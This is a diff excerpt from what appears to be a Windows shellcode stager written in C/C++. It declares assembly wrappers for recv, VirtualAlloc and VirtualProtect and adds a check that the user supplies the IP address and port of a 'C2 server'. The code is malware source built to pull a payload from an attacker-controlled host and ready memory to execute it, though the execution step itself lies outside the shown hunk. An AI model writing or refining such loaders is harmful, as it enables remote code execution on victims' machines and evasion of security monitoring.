@@ -12,12 +12,24 @@ extern "C" int __fastcall asmRecv(SOCKET s, void * buf, int size, FARPROC funcAd
 extern "C" LPVOID __fastcall asmVirtualAlloc(FARPROC funcAddress, int stageSize, DWORD flAllocationType, DWORD flProtect);
 extern "C" LPVOID __fastcall asmVirtualProtect(void* addr, int stageSize, DWORD flNewProtect, FARPROC funcAddress);
 
+WSADATA WSAData;
+
 int main(int argc, const char * argv[])
 {
-	const char* ip = argv[1];
-	int port = strtol(argv[2], NULL, 10);
+	const char* ip;
+	int port;
 
-	WSADATA WSAData;
+	if (argc != 3)
+	{
+		printf("[-] please specify the IP address and port number of the C2 server. Exiting...");
+		return 1;
+	}
+	else
+	{
+		ip = argv[1];
+		port = strtol(argv[2], NULL, 10);
+	}
+
 	SOCKET socket = 0;
 	int stageSize = 0;
 	int bytesReceived = 0;
